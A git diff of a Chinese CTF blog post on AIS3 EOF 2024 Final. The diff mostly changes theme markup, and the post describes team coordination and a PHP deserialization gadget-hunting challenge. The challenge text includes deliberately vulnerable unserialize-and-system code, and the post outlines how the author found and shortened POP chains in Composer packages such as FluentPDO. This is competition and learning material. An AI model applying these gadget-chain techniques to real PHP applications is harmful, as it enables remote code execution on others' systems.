@@ -6,6 +6,116 @@
     <meta name="keywords" content="Ching367436,臺中一中電腦資訊研習社 38th 副社長,Bamboofox 社長,書卷獎,資安,AIS3 最佳專題">
     
     <meta name="author" content="Ching367436">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
     <!-- preconnect -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -18,20 +128,23 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三.">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AIS3 EOF 2024 Final">
 <meta property="og:url" content="https://blog.ching367436.me/ais3-eof-2024-final/">
 <meta property="og:site_name" content="Ching367436">
-<meta property="og:description" content="本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三.">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://blog.ching367436.me/ais3-eof-2024-final/TakeKitsune.webp">
+<meta property="og:image" content="https://blog.ching367436.me/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-02-05T13:27:31.000Z">
 <meta property="article:author" content="Ching367436">
 <meta property="article:tag" content="ais3">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.ching367436.me/ais3-eof-2024-final/TakeKitsune.webp">
+<meta name="twitter:image" content="https://blog.ching367436.me/images/redefine-og.webp">
     
     
         <!-- Google tag (gtag.js) -->
@@ -53,9 +166,8 @@
     
     <title>
         
-            AIS3 EOF 2024 Final -
+            AIS3 EOF 2024 Final | Ching367436&#39;s blog
         
-        Ching367436&#39;s blog
     </title>
 
     
@@ -92,7 +204,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -116,7 +228,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"pangu_js":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -138,7 +250,7 @@
     
     
     
-<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+<meta name="generator" content="Hexo 8.0.0"><style>mjx-container[jax="SVG"] {
   direction: ltr;
 }
 
@@ -254,33 +366,29 @@ mjx-container[display="true"] + br {
 </head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
-
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
@@ -361,7 +469,7 @@ mjx-container[display="true"] + br {
     </div>
 
     <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
         <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
                 
@@ -432,15 +540,15 @@ mjx-container[display="true"] + br {
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -451,44 +559,41 @@ mjx-container[display="true"] + br {
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/ais3-eof-2024-final/TakeKitsune.webp" alt="AIS3 EOF 2024 Final" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">AIS3 EOF 2024 Final</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                
-                
-                <img src="/ais3-eof-2024-final/TakeKitsune.webp" alt="AIS3 EOF 2024 Final" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
-                
-                <div class="w-full flex items-center absolute bottom-0 justify-start">
-                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">AIS3 EOF 2024 Final</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/Ching367436.jpg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/Ching367436.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-02-05 21:27:31</span>
@@ -555,40 +660,40 @@ mjx-container[display="true"] + br {
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三. 這經驗對於我未來的團隊管理會有很大的幫助.</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三. 這經驗對於我未來的團隊管理會有很大的幫助.</p>
 <p>另外這次共有 5 題, 其中 4 題最需要的都是 web, 只有一題是 pwn, 然後我這隊只有我 &amp; ywc 是打 web 的..</p>
 <h2 id="popper-KoH"><a href="#popper-KoH" class="headerlink" title="popper [KoH]"></a>popper [KoH]</h2><p>Author: splitline</p>
-<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">TL;DR: 找到網路上隨便一個 composer package 裡的反序列化 RCE gadget，越好用+越短越好。</span><br><span class="line"></span><br><span class="line">你可以安裝任意一個存在的 composer package，目標是找到一個能執行任意 function 的反序列化 gadget</span><br><span class="line"></span><br><span class="line">你需要使用 p0pp3r<span class="emphasis">_win function 來執行 ./@ --give-me-flag 指令</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">只有 p0pp3r_</span>win 是有效的目標，其他任何的 function 都不會被計分系統接受，就算其能成功達成 RCE</span><br><span class="line"></span><br><span class="line">你的 payload 中必須至少使用到一個直接屬於 package 的 namespace 裡的 class（根據 psr-0、psr-4 判斷）</span><br><span class="line"></span><br><span class="line">對於每一個 package，只會存在一個最佳 gadget 能獲得分數，比較順位如下：</span><br><span class="line"></span><br><span class="line">Gadget 依賴條件：毋需條件 &gt; <span class="strong">__toString &gt; __</span>call</span><br><span class="line"></span><br><span class="line">Payload 長度：短的可以取代長的</span><br><span class="line"></span><br><span class="line">Package 星星數越多，其價值分數越高</span><br><span class="line"></span><br><span class="line">分數計算以執行完成的時刻為準，而非提交時間；若一個 payload 尚未執行完畢，無法嘗試第二個</span><br><span class="line"></span><br><span class="line">一律安裝「2024/2/3 10:00 UTC+8 前」釋出的最新一個版本</span><br><span class="line"></span><br><span class="line">執行環境為 docker 映像 php:cli，原始碼大致上如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">require 'vendor/autoload.php';</span><br><span class="line">function p0pp3r<span class="emphasis">_win($command) {</span></span><br><span class="line"><span class="emphasis">  system($command);</span></span><br><span class="line"><span class="emphasis">}</span></span><br><span class="line"><span class="emphasis">unserialize(PAYLOAD);</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">TL;DR: 找到網路上隨便一個 composer package 裡的反序列化 RCE gadget，越好用+越短越好。</span><br><span class="line"></span><br><span class="line">你可以安裝任意一個存在的 composer package，目標是找到一個能執行任意 function 的反序列化 gadget</span><br><span class="line"></span><br><span class="line">你需要使用 p0pp3r<span class="emphasis">_win function 來執行 ./@ --give-me-flag 指令</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">只有 p0pp3r_</span>win 是有效的目標，其他任何的 function 都不會被計分系統接受，就算其能成功達成 RCE</span><br><span class="line"></span><br><span class="line">你的 payload 中必須至少使用到一個直接屬於 package 的 namespace 裡的 class（根據 psr-0、psr-4 判斷）</span><br><span class="line"></span><br><span class="line">對於每一個 package，只會存在一個最佳 gadget 能獲得分數，比較順位如下：</span><br><span class="line"></span><br><span class="line">Gadget 依賴條件：毋需條件 &gt; <span class="strong">__toString &gt; __</span>call</span><br><span class="line"></span><br><span class="line">Payload 長度：短的可以取代長的</span><br><span class="line"></span><br><span class="line">Package 星星數越多，其價值分數越高</span><br><span class="line"></span><br><span class="line">分數計算以執行完成的時刻為準，而非提交時間；若一個 payload 尚未執行完畢，無法嘗試第二個</span><br><span class="line"></span><br><span class="line">一律安裝「2024/2/3 10:00 UTC+8 前」釋出的最新一個版本</span><br><span class="line"></span><br><span class="line">執行環境為 docker 映像 php:cli，原始碼大致上如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">require 'vendor/autoload.php';</span><br><span class="line">function p0pp3r<span class="emphasis">_win($command) {</span></span><br><span class="line"><span class="emphasis">  system($command);</span></span><br><span class="line"><span class="emphasis">}</span></span><br><span class="line"><span class="emphasis">unserialize(PAYLOAD);</span></span><br></pre></td></tr></table></figure></div>
 
-<h3 id="比賽情況"><a href="#比賽情況" class="headerlink" title="比賽情況"></a>比賽情況</h3><p>看到這種題目一定就會想拿 PHPGGC 直接炸下去🍤, 所以題目作者就在 -1 回合的時候就用 NPC 隊把他生的 payload 全部都用上去, 請 AxelHowe (打 pwn 的) 跟 Ching367436 幫忙試才發現的, 接著 Ching367436 看到 PHPGGC 有 <a class="link" target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc/pull/160">pr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 裡面有其他原本沒有的, 發現全部都不行, 後來有隊伍拿 edu-ctf 的 chain 來打 (predis), 就待在排名上面一直拿分, 第一天那題就沒有動靜了</p>
-<p>第二天清晨, 我在 <a class="link" target="_blank" rel="noopener" href="https://packagist.org/explore/popular">https://packagist.org/explore/popular <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 逛了各種熱門的 composer 的 app. 基本上流程就是把 package 載下來, 找 php magic method, 找不到就刪掉換下一個, 發現其實 <code>__destruct</code> 還蠻稀有的, 後來翻到 <a class="link" target="_blank" rel="noopener" href="https://packagist.org/explore/popular?query=FluentPDO">https://packagist.org/explore/popular?query=FluentPDO <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , 然後 splitline 那邊有<a class="link" target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/tree/master/tsj-ctf/avatar">現成的 chain <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可用, 拿來改成可以用的形狀後, 我把一個 chain 當 3 個來用, 因為 <code>envms/fluentpdo</code> <code>lichtner/fluentpdo</code> <code>fpdo/fluentpdo</code> 都是同個東西, 所以就用這個拿 3 倍的分數, 靠這個就在這題第一名待了幾個小時, 後來被抄走了 ==.</p>
+<h3 id="比賽情況"><a href="#比賽情況" class="headerlink" title="比賽情況"></a>比賽情況</h3><p>看到這種題目一定就會想拿 PHPGGC 直接炸下去🍤, 所以題目作者就在 -1 回合的時候就用 NPC 隊把他生的 payload 全部都用上去, 請 AxelHowe (打 pwn 的) 跟 Ching367436 幫忙試才發現的, 接著 Ching367436 看到 PHPGGC 有 <a class="link" target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc/pull/160">pr<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, 裡面有其他原本沒有的, 發現全部都不行, 後來有隊伍拿 edu-ctf 的 chain 來打 (predis), 就待在排名上面一直拿分, 第一天那題就沒有動靜了</p>
+<p>第二天清晨, 我在 <a class="link" target="_blank" rel="noopener" href="https://packagist.org/explore/popular">https://packagist.org/explore/popular<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 逛了各種熱門的 composer 的 app. 基本上流程就是把 package 載下來, 找 php magic method, 找不到就刪掉換下一個, 發現其實 <code>__destruct</code> 還蠻稀有的, 後來翻到 <a class="link" target="_blank" rel="noopener" href="https://packagist.org/explore/popular?query=FluentPDO">https://packagist.org/explore/popular?query=FluentPDO<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> , 然後 splitline 那邊有<a class="link" target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/tree/master/tsj-ctf/avatar">現成的 chain<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可用, 拿來改成可以用的形狀後, 我把一個 chain 當 3 個來用, 因為 <code>envms/fluentpdo</code> <code>lichtner/fluentpdo</code> <code>fpdo/fluentpdo</code> 都是同個東西, 所以就用這個拿 3 倍的分數, 靠這個就在這題第一名待了幾個小時, 後來被抄走了 ==.</p>
 <h4 id="各種縮短-POP-Chain-的手法"><a href="#各種縮短-POP-Chain-的手法" class="headerlink" title="各種縮短 POP Chain 的手法"></a>各種縮短 POP Chain 的手法</h4><p>第一種就是直接找其他更短的 chain, 但時間成本較高. 我在 <code>fluentpdo</code> 被搶走後採用的是: 在生 chain 的過程把所有 <code>private</code> <code>protected</code> 的部分改成 <code>public</code>, 這樣可以少一些 <code>\x00</code>  如下:</p>
 <p><img src="/ais3-eof-2024-final/poper-public.webp"></p>
